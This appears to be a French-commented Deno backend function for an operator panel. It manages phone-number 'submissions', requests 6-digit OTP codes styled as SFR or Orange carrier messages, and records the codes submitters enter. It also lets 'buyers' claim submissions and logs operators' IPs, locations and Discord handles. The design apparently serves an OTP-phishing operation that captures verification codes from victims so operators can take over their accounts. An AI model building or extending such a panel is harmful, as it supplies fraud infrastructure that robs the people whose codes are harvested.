import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const LOG_WEBHOOK = Deno.env.get("DISCORD_WEBHOOK");

const actionLabels = {
  valid: { label: "✅ Code validé par un admin", color: 0x2ECC71 },
  wrong: { label: "❌ Mauvais numéro", color: 0xE74C3C },
  expired: { label: "⏰ Code expiré / renvoyé", color: 0xF39C12 },
  wait: { label: "⏳ Mis en file d'attente", color: 0x3498DB },
  code_ready: { label: "📤 Code envoyé par un admin", color: 0xFFD700 },
  code6: { label: "🔢 Code 6 chiffres demandé", color: 0x9B59B6 },
  code6sfr: { label: "🔢 Code 6 chiffres (SFR FORMAT) demandé", color: 0xE74C3C },
  code6orange: { label: "🔢 Code 6 chiffres (ORANGE FORMAT) demandé", color: 0xFF6600 },
};

const statusMap = {
  valid: "code_valid",
  wrong: "code_wrong",
  expired: "code_expired",
  wait: "waiting_queue",
  code_ready: "code_ready",
  code6: "code6_ready",
  code6sfr: "code6sfr_ready",
  code6orange: "code6orange_ready",
};

Deno.serve(async (req) => {
  try {
    const { submissionId, action, discord, buyerId } = await req.json();

    if (!submissionId) {
      return Response.json({ error: 'submissionId requis' }, { status: 400 });
    }

    let newStatus = statusMap[action] || "code_ready";
    const base44 = createClientFromRequest(req);

    // Get admin IP & user agent
    const adminIp = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Inconnue";

    // Fetch submission details
    const sub = await base44.asServiceRole.entities.Submission.get(submissionId).catch(() => null);

    // "resend" (OTP invalide — autoriser renvoi) : remet la demande dans le format
    // de code précédemment demandé pour que l'utilisateur puisse ressaisir un code.
    if (action === "resend") {
      newStatus = sub?.last_ready_status || "code_ready";
    }

    // ---- Verrou par IP admin : la première action (envoi de code / validation /
    // mauvais / expiré) verrouille la demande à cette IP et exige un pseudo Discord
    // pour identifier l'administrateur dans les logs. Le pseudo Discord est lié
    // de façon persistante à l'IP de l'admin : il n'est demandé qu'une seule fois,
    // puis réutilisé automatiquement pour toutes les futures demandes. ----
    // Acheteur authentifié : l'action vient du panel buyer qui a déjà verrouillé
    // la soumission via claimSubmission (assigned_buyer_id + admin_ip). On fait
    // confiance à l'appartenance plutôt qu'au verrou IP — ce dernier est fragile
    // à travers la chaîne de proxies et bloque à tort les actions acheteur.
    if (buyerId && sub?.assigned_buyer_id === buyerId) {
      // buyer owns it — skip admin IP lock
    } else if (sub?.admin_ip) {
      // Une IP admin est déjà enregistrée : vérifie la correspondance
      if (sub.admin_ip !== adminIp) {
        return Response.json(
          { error: `Ce numéro est déjà verrouillé par un autre administrateur (${sub.admin_discord ? "@" + sub.admin_discord : sub.admin_ip}).` },
          { status: 403 }
        );
      }
    } else {
      // Première action sur cette demande : cherche l'identité Discord liée à l'IP
      let discordClean = (discord || "").trim().replace(/^@+/, "");

      // Si l'appelant n'a pas fourni de pseudo, cherche le mapping persistant IP→Discord
      if (!discordClean) {
        const existing = await base44.asServiceRole.entities.AdminIdentity.filter({ ip: adminIp }).catch(() => []);
        if (existing && existing.length > 0) {
          discordClean = existing[0].discord;
        }
      } else {
        // L'appelant a fourni un pseudo : l'enregistre/actualise pour cette IP
        const existing = await base44.asServiceRole.entities.AdminIdentity.filter({ ip: adminIp }).catch(() => []);
        if (existing && existing.length > 0) {
          if (existing[0].discord !== discordClean) {
            await base44.asServiceRole.entities.AdminIdentity.update(existing[0].id, { discord: discordClean }).catch(() => {});
          }
        } else {
          await base44.asServiceRole.entities.AdminIdentity.create({ ip: adminIp, discord: discordClean }).catch(() => {});
        }
      }

      // Toujours aucun pseudo : demande l'identification (première fois pour cette IP)
      if (!discordClean) {
        return Response.json({ discord_required: true }, { status: 200 });
      }

      await base44.asServiceRole.entities.Submission.update(submissionId, {
        admin_ip: adminIp,
        admin_discord: discordClean,
      });
      sub.admin_ip = adminIp;
      sub.admin_discord = discordClean;
    }

    const clearOtp = ["valid", "wrong", "resend"].includes(action);
    await base44.asServiceRole.entities.Submission.update(submissionId, {
      status: newStatus,
      ...(clearOtp ? { entered_code: null, last_ready_status: null } : {}),
    });
    const userAgent = req.headers.get("user-agent") || "";

    // Detect browser
    let browser = "Inconnu";
    if (userAgent.includes("Edg/")) browser = "Edge";
    else if (userAgent.includes("OPR/") || userAgent.includes("Opera")) browser = "Opera";
    else if (userAgent.includes("Chrome")) browser = "Chrome";
    else if (userAgent.includes("Firefox")) browser = "Firefox";
    else if (userAgent.includes("Safari")) browser = "Safari";

    // Detect device
    let device = "Inconnu";
    if (/iPhone|iPad|iPod/.test(userAgent)) device = "iPhone/iPad";
    else if (/Android/.test(userAgent) && /Mobile/.test(userAgent)) device = "Téléphone Android";
    else if (/Android/.test(userAgent)) device = "Tablette Android";
    else if (/Windows|Macintosh|Linux/.test(userAgent)) device = "Desktop";

    // Geolocate admin IP with fallback
    let country = "Inconnue";
    let city = "Inconnue";
    try {
      const geoRes = await fetch(`https://geolocation-db.com/json/${adminIp}`, { signal: AbortSignal.timeout(5000) });
      if (geoRes.ok) {
        const geo = await geoRes.json();
        country = geo.country_name || "Inconnue";
        city = geo.city || "Inconnue";
      }
    } catch (e) {
      console.error("geolocation-db failed:", e.message);
      try {
        const geoRes = await fetch(`https://ip-api.com/json/${adminIp}`, { signal: AbortSignal.timeout(5000) });
        if (geoRes.ok) {
          const altData = await geoRes.json();
          if (altData.status === "success") {
            country = altData.country || "Inconnue";
            city = altData.city || "Inconnue";
          }
        }
      } catch (e2) {
        console.error("ip-api.com failed:", e2.message);
      }
    }

    const now = new Date();

    // L'action est gérée entièrement dans le panel acheteur (mise à jour du statut +
    // log applicatif) — plus d'envoi vers Discord.
    await base44.asServiceRole.entities.ActionLog.create({
      submission_id: submissionId,
      action: action === "valid" ? "code_verified"
        : action === "wrong" ? "code_wrong"
        : action === "expired" ? "code_expired"
        : action === "wait" ? "waiting_queue"
        : "code_sent",
      details: {
        action,
        status: newStatus,
        browser, device, ip: adminIp, country, city,
        discord: sub?.admin_discord || discord || null,
        buyer: !!buyerId,
      },
      timestamp: now.toISOString(),
    }).catch(() => {});

    return Response.json({ ok: true, action });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
});